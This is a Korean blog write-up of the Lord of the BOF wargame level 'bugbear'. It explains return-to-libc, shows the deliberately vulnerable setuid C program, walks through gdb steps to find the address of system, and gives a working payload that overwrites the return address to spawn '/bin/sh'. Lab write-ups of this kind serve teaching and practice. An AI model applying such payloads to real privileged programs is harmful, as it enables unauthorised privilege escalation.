---
title: The Lord of the BOF - darkknight -> bugbear
slug: lob-darkknight
date: 2016-09-08 17:10:00 +0900 KST
categories: [write-up]
markup: mmark
---

return to library 개념 이해하기

아래는 문제의 코드

```c
/*
    The Lord of the BOF : The Fellowship of the BOF
    - bugbear
    - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
    char buffer[40];
    int i;

    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }

    if(argv[1][47] == '\xbf')
    {
        printf("stack betrayed you!!\n");
        exit(0);
    }

    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

이전 단계까지는 삽입한 쉘코드의 주소를 ret에 넣어서 쉘 권한을 얻어냈었다.

그런데 옛날부터 스택을 이용한 공격은 안된지 오래다.

그래서 RTL을 쓰는데...

ret 영역에는 system 함수 주소를 넣고, system 함수에 인자로 ebp+8이 될 곳에 "/bin/sh" 문자열의 주소를 넣으면 문제를 풀 수 있다.

```sh
$ cp bugbear augbear
$ ls -l
total 28
-rwxr-xr-x    1 darkknig darkknig    12043 Sep  2 09:05 augbear
-rwsr-sr-x    1 bugbear  bugbear     12043 Mar  8  2010 bugbear
-rw-r--r--    1 root     root          385 Mar 29  2010 bugbear.c
```

gdb랑 core 덤프용으로 bugbear를 augbear로 복사하고

```x86asm
$ gdb augbear -q
(gdb) b main
Breakpoint 1 at 0x8048436
(gdb) r
Starting program: /home/darkknight/augbear

Breakpoint 1, 0x8048436 in main ()
(gdb) print system
$1 = {} 0x40058ae0 <__libc_system>
```

system 함수 주소를 알아내고

그리고 x/10000s 쳐서 "/bin/sh"를 찾아서 풀었다.

아래는 페이로드

```sh
./bugbear `python -c 'print "A"*44 + "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40"'`
```
